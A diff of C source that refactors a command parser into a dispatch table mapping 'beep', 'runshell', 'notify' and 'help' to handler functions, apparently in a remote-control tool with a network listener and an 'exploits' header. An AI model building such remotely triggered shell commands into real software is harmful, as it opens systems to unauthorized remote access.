@@ -37,6 +37,12 @@
 #include <errors/errors.h>
 #include <server/server.h>
 #include <server/listener.h>
+#include <exploits/help.h>
+
+typedef struct {
+    const char *name;
+    int (*command)();
+} CommandsHandlerMap;
 
 int systemBeep() {
     printf("\a");
@@ -54,13 +60,20 @@ int sendNotify() {
 }
 
 
-int parse_option(const char buffer[1024]) {
-    if(strcmp(buffer, "1999beep") == 0)
-        return systemBeep();
-    else if(strcmp(buffer, "1999shell") == 0)
-        return runShell();
-    else if(strcmp(buffer, "1999notify") == 0)
-        return sendNotify();
+CommandsHandlerMap commandsMap[] = {
+    {"beep", systemBeep},
+    {"runshell", runShell},
+    {"notify", sendNotify},
+    {"help", helpCommand},
+    {NULL, NULL}
+};
 
-    return -1;
+void parseCommand(const char *command) {
+    for (int i = 0; commandsMap[i].name != NULL; i++) {
+        if (strcmp(commandsMap[i].name, command) == 0) {
+            commandsMap[i].command();
+            return;
+        }
+    }
+    printf("Cannot find command: %s\n", command);
 }
